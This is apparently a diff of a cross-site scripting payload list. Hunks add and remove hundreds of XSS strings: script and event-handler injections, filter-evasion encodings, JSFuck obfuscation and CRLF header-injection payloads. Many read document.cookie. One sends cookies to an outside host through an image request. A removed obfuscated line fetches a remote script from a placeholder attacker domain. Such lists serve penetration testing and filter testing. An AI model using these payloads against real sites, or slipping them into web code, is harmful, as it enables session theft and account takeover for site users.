2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%28%5B%2B%5B%5D%5D%2B%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <BR SIZE="&{alert('XSS')}">
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
@@ -237,9 +845,24 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 </script><script>alert('XSS');</script>
 '"><A HRef=" AutoFocus OnFocus=top/**/?.'ale'%2B'rt'>"
 <BODY BACKGROUND="javascript:alert('XSS')">
+‘;alert(123);t=’
+“;alert(123);t=”
+‘>alert(154)</script><script/154=’
+*/alert(155)</script><script>/*
+*/alert(156)”>’onload=”/*<svg/156=’
+`-alert(158)”>’onload=”`<svg/158=’
+<alert(192)<! — onmouseover=location=innerHTML+outerHTML>javascript:192/*00000*/
+alert(1) 
+/alert`2`/i
+‘-alert(79)-’
+alert = a\u006cer\u0074
+';alert(1);function myFunc(){}'
+“])},alert(1));(function xss() {//
+“alert(1)” instanceof [];
 <IMG DYNSRC="javascript:alert('XSS')">
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
 <svg/onload=alert('XSS')>
+<svg/onload=window["al"+"ert"]1337>
 &quot;&gt;&lt;svg onload=alert&amp;amp;#x00000040&quot;1&quot;&gt;	
 &lt;svg onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;	
 &lt;svg/onload=&#39;alert&amp;#40 23 &amp;#41;&#39;&gt;	
@@ -268,17 +891,19 @@ PHN2Zy9vbmxvYWQ9J2FsZXJ0Jz4=
 <a href=&#01javascript:alert(1)>
 <a href=javascript&colon;confirm(1)>
 <a href="jav%0Dascript&colon;alert(1)">
-<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme 
 tarun"><x/onafterscriptexecute=confirm%26lpar;)// 
-<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
 %uff1cscript%uff1ealert(‘XSS’);%uff1c/script%uff1e
 <%tag onmouseover="alert('markitzeroday.com')">
 %uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e
 %uff3c%uff73%uff6cr%uff69%uff63%uff74%uffe0alert('XSS')%uff3e
 %u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003ealert('XSS')%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e
+1</Script><Script>1/*'/*\'/**//alert(1)//
+1'"--><A HRef AutoFocus OnFocus=alert(1)//>
 %uff3c%uff73%uff63%uff72%uff69%uff70%uff74%uff3ealert('XSS')%uff3c%uff2f%uff73%uff63%uff72%uff69%uff70%uff74%uff3e
 %uff3cscript%uff3ealert('XSS')%uff3c/script%uff3e
 %3Cscript%3Ealert('XSS')%3C/script%3E
+<K ContentEditable AutoFocus OnFocus=alert(1)>
+“AutoFocus OnFocus=alert(1)//
 %u003Cscript%u003Ealert('XSS')%u003C/script%u003E
 %253Cscript%253Ealert('XSS')%253C/script%253E
 %uff3c%uff73%uff63%uff72%uff69%uff70%uff74%uffe0alert('XSS')%uff3e
@@ -288,8 +913,6 @@ tarun"><x/onafterscriptexecute=confirm%26lpar;)//
 <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
 \<a onmouseover=alert(document.cookie)\>xxs link\</a\>
 <IMG SRC=# onmouseover="alert('xxs')">
-%3B%C3%81=![]%3B%C3%89=!![]%3B%C3%8D=[][[]]%3B%C3%93=%2B[![]]%3BSI=%2B(%2B!%2B[]%2B(!%2B[]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B[%2B!%2B[]]%2B[%2B[]]%2B[%2B[]]%2B[%2B[]])%3BST=([]%2B[])%3B%C3%9C=(%2B[])%3BA=(%C3%81%2B%22%22)[1]%3BD%20=%20(%C3%8D%2B%22%22)[2]%3BE%20=%20(%C3%89%2B%22%22)[3]%3BF%20=%20(%C3%81%2B%22%22)[0]%3BG%20=%20[![]%2B[%2B[]]%2B[[]%2B[]][%2B[]][[![]%2B%7B%7D][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[[]%2B%7B%7D][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B!%2B[]]%2B[![]%2B[]][%2B[]][!%2B[]%2B!%2B[]%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B[]]%2B[![]%2B%7B%7D][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[[]%2B%7B%7D][%2B[]][%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]]][%2B[]][!%2B[]%2B!%2B[]%2B[%2B[]]]%3BI%20=%20([%C3%81]%2B%C3%8D)[10]%3BL%20=%20(%C3%81%2B%22%22)[2]%3BT%20=%20(%C3%89%2B%22%22)[0]%3BO%20=%20(%C3%89%2B[][F%2BI%2BL%2BL])[10]%3BR%20=%20(%C3%89%2B%22%22)[1]%3BN%20=%20(%C3%8D%2B%22%22)[1]%3BM%20=%20(%2B(208))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](31)[1]%3BP%20=%20(%2B(211))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](31)[1]%3BS%20=%20(%C3%81%2B%22%22)[3]%3BU%20=%20(%C3%8D%2B%22%22)[0]%3BV%20=%20(%2B(31))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](32)%3BX%20=%20(%2B(101))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](34)[1]%3BY%20=%20(%C3%93%2B[SI])[10]%3BZ%20=%20(%2B(35))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](36)%3BC%20=%20([][F%2BI%2BL%2BL]%2B%22%22)[3]%3BH%20=%20(%2B(101))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](21)[1]%3BK%20=%20(%2B(20))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](21)%3BW%20=%20(%2B(32))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](33)%3BJ%20=%20([][E%2BN%2BT%2BR%2BI%2BE%2BS]()%2B%22%22)[3]%3BB%20=%20([][E%2BN%2BT%2BR%2BI%2BE%2BS]()%2B%22%22)[2]%3BDOT%20=%20(%2B(%2211E100%22)%2B[])[1]%3BSLA=(![]%2B[%2B![]])[([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B(!![]%2B[])[%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B([][(![]%2B[])[%2B[]]%2B([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B[]]%2B(!![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B!%2B[]]]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]]()[%2B!%2B[]%2B[%2B[]]]%3B[][F%2BI%2BL%2BL][C%2BO%2BN%2BS%2BT%2BR%2BU%2BC%2BT%2BO%2BR](S%2BE%2BT%2B%22T%22%2BI%2BM%2BE%2BO%2BU%2BT%2B%22(%22%2BF%2BU%2BN%2BC%2BT%2BI%2BO%2BN%2B%22()%7B%20$%22%2BDOT%2BG%2BE%2BT%2B%22S%22%2BC%2BR%2BI%2BP%2BT%2B%22('%22%2BSLA%2BSLA%2B%22BADASSDOMAIN%22%2BDOT%2B%22COM%22%2BSLA%2B%22BADASSURL')()%3B%20%7D,%203000)%3B%22)()%3B(%22
-<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 ><img/onerror="javascript:alert(1%26%23x000000029;" src=x>
 "><iframe/src="javascript:alert(1%26%23x00000000000000000000000000029;"></iframe>
 window['alXert'.replace(/X/, '')](self['document']['cookie'])
@@ -334,17 +957,13 @@ mrco24"type=image src onerror="alert(1)"
 "><script akdk> prompt(document.domain)</script akdk>
 foo?q=foo<script>alert('xss')<%2fscript>
 Login.aspx?username=<img/src/onerror=alert(ibro)>
-<details open ontoggle="alert(1)"><summary>Click me!</summary></details>
 <iframe srcdoc="<script>alert(1)</script>"></iframe>
 <img src="javascript:alert('XSS')" alt="Image">
 <Img Src=OnXSS OnError=confirm(document.cookie)>
-tagName%2BinnerHTML%2Blocation.hash%3E/*click%20me!#*/alert(document.domain)
 xxxxxxxxx'});});</script><script>prompt("PLEASE%20\nSUBSCRIBE")</script>
 xxxxxxxxx'});}); </script><script>prompt ("PLEASE%20\nSUBSCRIBE") </script>
 <img src=x onerror=print()>
-javascript://'/</title></style></textarea></script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
-javascript://%2F%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B%27%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
-javascript://%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS')
+javascript://'/</title></style></textarea></script>--><p"onclick=alert(123)//>*/alert()/*<img src=x onerror=alert(456)/><svg/onload=prompt(789)/>;'"// :;fn();{{12*12+'Audi RS5'.substr(0,4)}}XXX<script>alert('XSS')
 #jaVasCript:/*-/*/*\/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
 `javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert(123)//>/alert()/
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
@@ -357,8 +976,8 @@ javascript:/*/*/**/**/**/*%0D%0A%0d%0a*//**/oNclick-alert())//</style/</title/</
 javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert(123)//>*/alert()/*<img src=x onerror=alert(456)/><svg/onload=prompt(789)/>;'"// :;fn();%0a%0d\n\r\t{{12*12+'Audi RS5'.substr(0,4)}}XXX<script>alert('XSS')<img src=x onerror='(function s(){var i=new Image();i.src='http://bl4de.tech/bxss.php?c='+document.cookie+';'+encodeURIComponent(location.href);document.body.append(i)})()'/>#jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
 "onmouseover="alert(1)
 "onmouseover=alert(1)
-%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
-%E5%98%8D%E5%98%8ASet-Cookie%3A%20whoami%3Dthecyberneh%25u2028%25u2029XSS-Payload%3A%2520%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+嘍嘊Set-Cookie:whoami=thecyberneh嘍嘊嘍嘊嘍嘊嘼script嘾alert(1);嘼/script嘾
+嘍嘊Set-Cookie: whoami=thecyberneh%u2028%u2029XSS-Payload:%20<script>alert(1)</script>
 %0D%0A%0D%0A%3Cscript%3E%0D%0A%20alert(1);%0D%0A%3C/script%3E%0D%0A
 %E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE%0D%0A%0D%0A<script>%0D%0Aalert(1);%0D%0A</script>
 %E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%3Cscript%3Ealert(1);%3C/script%3E
@@ -387,7 +1006,6 @@ xss"><!--><svg/onload=alert(document.domain)>
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 #"onmouseover="alert(1)
 #javascript:alert(1)
-javascript:alert(1)
 "'><img src=q onerror=alert(1)>
 <img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>
 '-setTimeout`prompt\u0028document.domain\u0029`-'
@@ -408,6 +1026,85 @@ test@example(<script>alert(0)</script>).com
 #&lt;img&#47;src&#47;onerror=alert(`ibro`)&gt;
 #&lt;script&gt;prompt(document.domain)&lt;&#47;script&gt;
 JavaScript://%250Dtop.confirm?.(1)//
+1'"><!--><Base Href=//X55.is?
+1'-top['con\146irm'](1)-'
+/confirm(1)?.(1)//\
+/confirm?.(1)//\
+input.onfocus=alert(1)
+';alert`1`//
+alert(document.domain)
+input.onfocus=function(){alert(1)}
+input[0].onfocus=alert(1)
+input.onfocus=alert'XSS'
+document.domain;alert(1)
+alert(documentdomain)
+alert(1)alert(2)
+print(alert(1))
+alert('XSS')alert(2)
+alert=documentdomain
+input&onfocus='alert'1
+alert'XSS'&print+input
+alert=1&input=focus
+alert'XSS'+print#1
+input(onfocus)alert(1)
+input[0].onfocus(alert(1))
+input/on-focus(alert(1))
+alert(document.domain)?input()
+input[0].onfocus=alert(1);
+input{onfocus}=alert(1)/
+(alert(document.domain));
+input.focus()/alert(1)
+input[onfocus]=function(){alert('XSS')}
+print(alert(document.domain))
+input/onfocus=alert(1);
+alert(document.domain)#print
+alert'XSS'>input.focus()
+{alert(document.domain)}&input()
+input?onfocus=alert(1)
+input[0](onfocus(alert(1)));
+alert(document.domain)?"XSS"
+[alert(1)];input()
+input{onfocus}(alert(1))
+alert[1](document.domain)?
+input+onfocus(alert(1))
+alert(document.domain)/print
+input.onfocus{alert('XSS')}
+alert(1)&document.domain
+'input'[onfocus]=alert(1);
+print(alert'XSS')
+(input().onfocus)=alert(document.domain)
+document.domain?print(alert(1))
+input[alert]#(document.domain)
+alert(document.domain)/input
+input(onfocus)="alert(1)"
+input{alert}(document.domain)
+input.focus;alert[1]
+input<alert(1)>print()
+input(onfocus)[alert(document.domain)]
+alert(input.focus)=1
+[alert](document.domain)
+document.domain;alert'XSS'
+input(alert)=(document.domain)
+{alert(document.domain)}/print
+input().onfocus='alert(1)'
+alert(1)?input=document.domain
+input.alert(document.domain)
+print[alert](document.domain);
+<img src=x onerror='alert(1)'>
+<input type="text" onfocus="alert('XSS')">
+{alert:(1)}
+</title><img src=x onerror=alert(1)>
+document['domain'].alert(1)
+'"><img src=x onerror="alert(1)">
+a.href=javascript:alert(1)
+img.src=x;img.onerror=alert(1)
+input[0](onfocus=alert(1))
+obj={alert:1};obj.alert=1
+document[domain]=function(){alert(1)}
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<svg onload=eval`alert(1)`></svg>
+<input autofocus onfocus=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+input[0].onfocus=function(){alert(1)}
 #"><img src=x onerror=prompt(document.domain);>
 1')"<!--><Svg OnLoad=(confirm)(1)<!--
 amF2YXNjcmlwdDphbGVydCgiWHNzIGJ5IHZpa2FzIik=
@@ -416,22 +1113,54 @@ amF2YXNjcmlwdDphbGVydCgiWHNzIGJ5IHZpa2FzIik=
 -->""/></script><deTailS open x=">" ontoggle=(co\u006efirm)``>
 <svg%0Ao%00nload=%09((pro\u006dpt))()//
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
-<script x>alert('XSS')<script y>
 <script>onerror=alert;throw 1337</script>
+")%27--><sVG/onLoad=(confirm)(1)--!>"
+")%27--><SvG/onLoad=(conf&#105;rm)(1)--!>"
+")%27--><SvG/onLoaD=(co&#110;firm)(1)<!--"
+")%27--><sVG/onload=(conf&#105;rm)(1)<!--"
+")%27--><sVG/onload=(conf&#105;rm)(1)--!>"
+")%27--><SvG/onLoaD=(co&#110;firm)(1)--!>"
+alert(document.cookie)
+'"><AHRef=\"AutoFocusOnFocus​=top/**/?.document+cookie>
+'); alert('Humal')
+\\";alert('Humal');//
+*/alert('HUMAL\n-HUMAL'); //
+'); alert('Humal'); var x='
+\\'); alert(\'Humal\');var x=\'
+';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<img src='1' onerror/=alert(0) />
 <object onafterscriptexecute=confirm(0)>
+';alert(String.fromCharCode(88,83,83))//';
+;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//V></SCRIPT>>><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+alert(String.fromCodePoint(88,83,83))
+//”;alert(String.fromCharCode(88,83,83))
+‘;alert(String.fromCharCode(88,83,83))//
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></
+‘;alert(String.fromCharCode(88,83,83))//\’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//\”;alert(String.fromCharCode(88,83,83))//&#45;&#45;></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 xyz';"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>
 <img/src='1'/onerror=alert(0)>
 %E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
 <svgonload=alert(1)>
 "><svg/onload=confirm(1)>"@x.y
++330011223344;phone-context=<script>alert(0)</script>
+document.location='java\rscript:alert(1)'
+eval('ale'+'rt(0)');
+constructor.constructor("aler"+"t(3)")();
+[].filter.constructor('ale'+'rt(4)')();
 <img/src/onerror=alert(`ibro`)>
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <svg onload=alert%26%230000000040"")>
+%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%601%60%3E
+;1'"><!--><K Data-Spy=scroll Data-Target=&lt;Svg/OnLoad&equals;confirm?.(1)%26gt;%3E
+;1/47/42/55/55/41/76/74Img/40Src/40OnError/75confirm/140/113/140/76
+")%27--><sVG/onload=(co&#110;firm)(1)<!--"
 #<img/src/onerror=alert(`ibro`)>
-'-alert(1)-'
 #'-alert(1)-'
 #\"-alert(1)}//
-'%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
 >"'><script>alert(2);</script>
+#*/alert(1)
+'}alert(1);{'
+({‘ \’(){alert(1)}})[` \`]()
 >'"><script>alert(2);</script>
 +alert(1)+
 <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
@@ -451,7 +1180,6 @@ $("script(2)")
 &#x27;&quot;&gt;&lt;img src=x onerror=prompt(document['domain']);&gt;&#x27;
 " /> <script>alert('XSS Testing");</script> 
 ');alert(1)//
-<math><x xlink:href=javascript:confirm`1`>click
 " accesskey='x' onclick='confirm`1`' //
 <x/oncopy=alert()>x
 a=8,b=confirm,c=window,c.onerror=b;throw-a
@@ -461,8 +1189,6 @@ new Function`a\l\ert\`1\``
 ?url=%26%2302java%26%23115cript:alert(document.domain)
 `'";//><img/src=x onError="${x};alert(`1`);">
 `'";//><Img Src=a OnError=location=src>
-%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
-<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
 </script><script>confirm(document.cookie)</script>
 <sCriPt>confirm(documen.cookie)</ScRipt>
 %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
@@ -510,14 +1236,15 @@ aaaaa\”-confirm`1`//
 ";}(document.writeln(decodeURI(location.hash))-"#<iframe src=javascript:alert(document.domain)
 javascript://%250Aalert(1)
 mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
-&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
-"><track/onerror='confirm`1`'>
 <a href="javascript:alert(1)">a</a>
 <iframe src="javascript:alert(1)"></iframe>
 eval('alert(1)');
+javascript:window/*Ata*/[%27loc%27%2b%27ati%27%2b%27on%27]%3d%27java%27%2b%27scr%27%2b%27ipt:%27%2blocation/*#*/;alert(origin)
 \u0061\u006c\u0065\u0072\u0074(1)
 <svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>
 '"><script>alert(2);</script>
+"+self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])//
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 %3E'><script>alert(2);</script>
 %22-[9].every(alert)-%22//
 %22%3E'><script>alert(2);</script>
@@ -527,6 +1254,9 @@ eval('alert(1)');
 %22%27%3E'><script>alert(2);</script>
 '>  <script>alert(2);</script>
 '>'><SCript>alert(2);</script>
+"/><script>alert(1337);</script>
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
 %27%3E%27%3E%22%3E%script%3Ealert(2);%3C/script%3E
 '>👽💻🔥<script>alert(2);</script>
 '>'+'><script>alert(2);</script>
@@ -546,46 +1276,72 @@ eval('alert(1)');
 '\u003e\'</b><script>alert(document.cookie)</script><b><!--'
 '+ '</b><script>alert(document.cookie)</script><b><!--'
 (function(){alert(document.cookie)})();
+')})();alert(document.cookie);({}'
+'><!--</b><script>alert(document.cookie)</script><b><!--'
 "alert(document.cookie)['script'](2);"
 '});alert(document.cookie);//'
+'&lt;/b&gt;<script>alert(document.cookie)</script><b&gt;<!--
 '><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--
 ');alert(document.cookie)();//
+'> </b> <script> alert(document.cookie) </script> <b> <!--
+' style="display:none"><script>alert(document.cookie)</script><b><!--
+' + String.fromCharCode(41) + 'alert(document.cookie)' + String.fromCharCode(40) + '//
+'><b title="</b><script>alert(document.cookie)</script><b"><!--
+`${String.fromCharCode(60)}/b${String.fromCharCode(62)}<script>alert(document.cookie)</script>${String.fromCharCode(60)}b${String.fromCharCode(62)}<!--`
+'&#x29;&#x28;};alert(document.cookie);--&#x22; &lt;'
+"><img src=x onerror=alert`1`;
+"><img src=x onerror=alert('1');
+`"><img src=x onerror=alert`1`;
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1);%3E
+'>&#40;&#41;<script>alert(document.cookie)</script><b><!--'
+'&lt;/b&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;b&gt;&lt;!--'
+')};alert(document.cookie);//"
+')};alert(document.cookie);--" /*'
+'> <!-- </b> <script> alert(document.cookie) </script> <b> <!--'
+"><img src=x onerror=alert('1");
+"><img src=x onerror=alert&lsqb;1];
+"><img src=x onfocus=alert(1);>
+'<!--\x29\x28;}alert(document.cookie);//"-->'
+' title="</b><script>alert(document.cookie)</script><b><!--">'
+'%27%3E%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cb%3E%3C%21--'
 '\u0029\u0028};alert(document.cookie);//"
 "><svg/onload=alert(1);>
 "><iframe onload=alert(1);>
 "><audio onplay=alert(1);>
 "><img src="javascript:alert(1);" />
 %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3B%3E
-%22%2525%2F%28%29%2C%20alert%281%29%3B%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3B%3E%3Cscript%3E
-%3C%25%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E
-%22%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E
-%2522%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E
+"><img src=x onerror=alert 1;
 "><img src=x onerror=prompt(document.domain);<<
 "><img src=x onerror=prompt(document['domain']);>
 "><img src=x onerror=this.innerHTML=''><script>alert(document.domain)</script>">
 "><img src=x onerror=eval('prompt(document.domain)')>
+"><img src=x onerror=Function('prompt(document.domain)')()
 "><img src=x id="img"> <script>document.getElementById('img').addEventListener('error', function(){prompt(document.domain);})</script>
 "><img src=x onerror=prompt(document.domain);>
 "><img src=x><img src= onerror=prompt(document.domain);>
 PHNjcmlwdD5pbWcgc3JjPXggb25lcnJvci5wcm9tb3RlKHRy
 &quot;&gt;&lt;img src=x onerror=prompt(document.domain);&gt;
-%253C%2531%2533%2533%253E%253C%2539%253E%253C%2569%253D%2538%253B%253E%253C%253F%256A%2532%253E%253C%252F%2563%253E%253C%252F%2573%2563%2568%2572%2569%2570%2574%253E
 &lt;&lt;img src=x onerror=prompt(document)&gt;&gt;;
 "><img\ src=x\ onerror=prompt(document.domain);>
 "><img src=x onerror="prompt(document.domain);">
 "><img src=x onerror=prompt(document&#46;domain);>
 "><img src=x onerror=prompt(document%2Edomain);>
+"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" onerror=prompt(document.domain);>
 "><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>
 "><img src=x onerror=prompt(unescape('document%2Edomain'));>
 "><svg onload=prompt(document.domain);>
 "><img src=x onerror=prompt(document.domain); title=x>
 "><div style="background-image: url(x)" onerror=prompt(document.domain);>
